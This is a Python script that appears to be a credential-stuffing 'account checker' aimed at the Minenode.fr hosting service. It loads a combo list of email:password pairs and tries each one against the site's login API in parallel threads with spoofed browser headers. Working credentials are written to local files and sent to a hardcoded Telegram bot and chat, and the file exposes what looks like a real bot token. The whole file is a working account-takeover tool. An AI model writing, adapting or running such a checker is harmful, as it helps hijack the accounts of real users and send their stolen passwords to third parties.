import requests
from concurrent.futures import ThreadPoolExecutor
import threading
import os
import time
import json
import sys
from fake_useragent import UserAgent

# --- Telegram Bot Configuration ---
TELEGRAM_BOT_TOKEN = "7559676923:AAHtLsSDMdI01Cyp74C7HAp6YefdLffT1x4"  # YOUR BOT TOKEN
TELEGRAM_CHAT_ID = "-4816891288"    # YOUR CHAT ID
# ----------------------------------

# ANSI Color Codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ASCII Banner
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ███╗██╗███╗   ██╗███████╗███╗   ██╗ ██████╗ ██████╗ ███████╗    ███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ 
████╗ ████║██║████╗  ██║██╔════╝████╗  ██║██╔═══██╗██╔══██╗██╔════╝    ██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║   ██║██║  ██║█████╗      █████╗  ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║   ██║██║  ██║██╔══╝      ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║██║ ╚████║███████╗██║ ╚████║╚██████╔╝██████╔╝███████╗    ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      
{Colors.END}
{Colors.YELLOW}{Colors.BOLD}      ════════════════════════════════════════════════════════════════{Colors.END}
{Colors.PURPLE}{Colors.BOLD}        Minenode.fr Account Checker by StarkXNova{Colors.END}
{Colors.YELLOW}{Colors.BOLD}      ════════════════════════════════════════════════════════════════{Colors.END}
"""

class MinenodeChecker:
    def __init__(self):
        self.output_file_hits = "minenode_good.txt"
        self.output_file_custom = "minenode_custom.txt" # For suspended accounts
        self.stats = {
            'total': 0,
            'checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'custom': 0, # For suspended accounts
            'start_time': None,
            'lock': threading.Lock(),
            'cpm': 0 # Initialize CPM
        }
        self.cpm_last_update_time = time.time()
        self.cpm_checked_at_last_update = 0
        self.user_agent_generator = UserAgent() # Initialize UserAgent generator
        self.print_stats_interval = 50 # Print stats every 50 accounts checked

    def update_stats(self, hit=False, fail=False, error=False, custom=False):
        """Update statistics"""
        with self.stats['lock']:
            self.stats['checked'] += 1
            if hit:
                self.stats['hits'] += 1
            elif fail:
                self.stats['fails'] += 1
            elif error:
                self.stats['errors'] += 1
            elif custom:
                self.stats['custom'] += 1
            
            # Recalculate CPM
            current_time = time.time()
            elapsed_from_last_cpm_update = current_time - self.cpm_last_update_time
            
            # Update CPM if enough time has passed (e.g., every 1 second or more)
            if elapsed_from_last_cpm_update >= 1 or (self.stats['checked'] - self.cpm_checked_at_last_update) >= 10:
                checks_since_last_cpm_update = self.stats['checked'] - self.cpm_checked_at_last_update
                if elapsed_from_last_cpm_update > 0:
                    self.stats['cpm'] = (checks_since_last_cpm_update / elapsed_from_last_cpm_update) * 60
                else:
                    self.stats['cpm'] = 0 # Avoid division by zero
                self.cpm_last_update_time = current_time
                self.cpm_checked_at_last_update = self.stats['checked']

    def print_stats(self):
        """Print real-time statistics by adding new lines to console."""
        with self.stats['lock']:
            progress_percent = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0.0

            output_lines = [
                f"{Colors.GREEN}[Hits] {self.stats['hits']}{Colors.END}",
                f"{Colors.YELLOW}[Custom] {self.stats['custom']}{Colors.END}",
                f"{Colors.RED}[Bad] {self.stats['fails']}{Colors.END}",
                f"{Colors.YELLOW}[Errors] {self.stats['errors']}{Colors.END}",
                f"{Colors.BLUE}[CPM] {int(self.stats['cpm'])}{Colors.END}",
                f"{Colors.CYAN}[Progress] {self.stats['checked']}/{self.stats['total']} = {progress_percent:.1f}%{Colors.END}"
            ]
            
            # Print each line, adding a newline character at the end
            print("\n".join(output_lines))
            sys.stdout.flush() # Ensure it's written immediately to console

    def send_telegram_message(self, message):
        """Sends a message to the configured Telegram chat."""
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            # print(f"{Colors.YELLOW}Telegram bot token or chat ID is not configured. Skipping message.{Colors.END}") # Can uncomment for debugging
            return

        telegram_api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML" # Use HTML for formatting
        }
        try:
            response = requests.post(telegram_api_url, json=payload, timeout=5)
            response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
            response_json = response.json()
            if not response_json.get("ok"):
                print(f"{Colors.RED}Telegram API error: {response_json.get('description', 'Unknown error')}{Colors.END}")
            # else:
                # print(f"{Colors.BLUE}Telegram message sent successfully.{Colors.END}") # Uncomment for debugging confirmation
        except requests.exceptions.HTTPError as e:
            print(f"{Colors.RED}Telegram HTTP error {e.response.status_code}: {e.response.text}{Colors.END}")
        except requests.RequestException as e:
            print(f"{Colors.RED}Telegram network error: {e}{Colors.END}")
        except json.JSONDecodeError:
            print(f"{Colors.RED}Telegram response not valid JSON. Response: {response.text}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}An unexpected error occurred while sending Telegram message: {e}{Colors.END}")


    def check_account(self, line, max_retries=3):
        """Check login for a single Minenode.fr account"""
        try:
            email, password = line.strip().split(":")
            
            user_agent = self.user_agent_generator.random
            
            headers = {
                "Host": "api.minenode.azurhosts.com",
                "Sec-Ch-Ua-Platform": '"macOS"',
                "Accept-Language": "en-GB,en;q=0.9",
                "Sec-Ch-Ua": '"Opera GX";v="120", "Not-A.Brand";v="8", "Chromium";v="135"',
                "User-Agent": user_agent,
                "Sec-Ch-Ua-Mobile": "?0",
                "Accept": "*/*",
                "Origin": "https://minenode.fr",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Storage-Access": "active",
                "Referer": "https://minenode.fr/",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i",
                "Connection": "keep-alive"
            }

            login_url = f"https://api.minenode.azurhosts.com/function/php/getconnection.php?email={requests.utils.quote(email)}&password={requests.utils.quote(password)}"
            
            for attempt in range(max_retries):
                try:
                    response = requests.get(login_url, headers=headers, timeout=10)
                    response.raise_for_status()

                    response_json = response.json()

                    if response_json.get("connexion") == "success":
                        suspended_status = response_json.get("suspended")
                        user_id = response_json.get('user_id', 'N/A')
                        
                        hit_message_console = ""
                        telegram_message = ""

                        if suspended_status == 0:
                            hit_message_console = f"{Colors.GREEN}[HIT] {email}:{password} | Active Account | User ID: {user_id}{Colors.END}"
                            telegram_message = (
                                f"<b>✅ Minenode.fr HIT (Active)</b>\n"
                                f"<b>Email:</b> <code>{email}</code>\n"
                                f"<b>Password:</b> <code>{password}</code>\n"
                                f"<b>User ID:</b> <code>{user_id}</code>\n"
                                f"<b>Status:</b> Active\n"
                            )
                            with open(self.output_file_hits, "a") as f:
                                f.write(f"{email}:{password} | Active | User ID: {user_id}\n")
                            self.update_stats(hit=True)
                        elif suspended_status == 1:
                            hit_message_console = f"{Colors.YELLOW}[CUSTOM] {email}:{password} | Suspended Account | User ID: {user_id}{Colors.END}"
                            telegram_message = (
                                f"<b>⚠️ Minenode.fr CUSTOM (Suspended)</b>\n"
                                f"<b>Email:</b> <code>{email}</code>\n"
                                f"<b>Password:</b> <code>{password}</code>\n"
                                f"<b>User ID:</b> <code>{user_id}</code>\n"
                                f"<b>Status:</b> Suspended\n"
                            )
                            with open(self.output_file_custom, "a") as f:
                                f.write(f"{email}:{password} | Suspended | User ID: {user_id}\n")
                            self.update_stats(custom=True)
                        else:
                            hit_message_console = f"{Colors.PURPLE}[UNKNOWN STATUS] {email}:{password} | Connexion Success, Unknown Suspended Status: {suspended_status} | User ID: {user_id}{Colors.END}"
                            telegram_message = (
                                f"<b>❓ Minenode.fr UNKNOWN STATUS</b>\n"
                                f"<b>Email:</b> <code>{email}</code>\n"
                                f"<b>Password:</b> <code>{password}</code>\n"
                                f"<b>User ID:</b> <code>{user_id}</code>\n"
                                f"<b>Status:</b> Connexion Success, Unknown Suspended Status: {suspended_status}\n"
                            )
                            with open(self.output_file_custom, "a") as f:
                                f.write(f"{email}:{password} | Connexion Success, Unknown Status: {suspended_status} | User ID: {user_id}\n")
                            self.update_stats(custom=True)
                        
                        print(hit_message_console) # Print hit/custom message immediately
                        self.send_telegram_message(telegram_message)
                        return True
                    
                    elif response_json.get("connexion") == "fail":
                        print(f"{Colors.RED}[BAD] {email}:{password} - Invalid Credentials{Colors.END}") # Print bad message immediately
                        self.update_stats(fail=True)
                        return False
                    else:
                        raise ValueError(f"Unexpected JSON response: {response_json}")

                except (requests.RequestException, json.JSONDecodeError, ValueError) as e:
                    print(f"{Colors.YELLOW}[ERROR] {email}:{password} - {type(e).__name__}: {str(e)}{Colors.END}") # Print error message immediately
                    self.update_stats(error=True)
                    if attempt < max_retries - 1:
                        time.sleep(2)
                        continue
                    break
            return False
            
        except Exception as e:
            print(f"{Colors.YELLOW}[ERROR] {line.strip()} - General Error: {str(e)}{Colors.END}") # Print error message immediately
            self.update_stats(error=True)
            return False
            
    def run(self):
        """Main execution function"""
        print(BANNER)
        
        # Check if Telegram is configured
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            print(f"{Colors.YELLOW}Warning: Telegram bot token or chat ID is not configured. Telegram messages will not be sent.{Colors.END}")
            print(f"{Colors.YELLOW}Please ensure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are correctly set in the script.{Colors.END}")
            time.sleep(2) # Give user time to read warning

        # Load accounts
        input_file = input(f"{Colors.CYAN}Enter combo file path: {Colors.END}")
        if not os.path.exists(input_file):
            print(f"{Colors.RED}Error: File {input_file} does not exist.{Colors.END}")
            return
        
        with open(input_file, "r") as f:
            accounts = [line.strip() for line in f if line.strip()]
        
        if not accounts:
            print(f"{Colors.RED}Error: File is empty.{Colors.END}")
            return
        
        self.stats['total'] = len(accounts)
        self.stats['start_time'] = time.time()
        
        print(f"{Colors.GREEN}Loaded {len(accounts)} accounts{Colors.END}")
        print(f"{Colors.BLUE}Starting checker...{Colors.END}")
        
        # Initial stats print
        self.print_stats() 

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.check_account, account) for account in accounts]
            
            for future in futures:
                future.result()
                # Print stats periodically
                if self.stats['checked'] % self.print_stats_interval == 0 or self.stats['checked'] == self.stats['total']:
                    self.print_stats()
        
        print(f"\n{Colors.GREEN}Completed! Good hits saved to {self.output_file_hits}, Custom/Suspended to {self.output_file_custom}{Colors.END}")

if __name__ == "__main__":
    checker = MinenodeChecker()
    checker.run()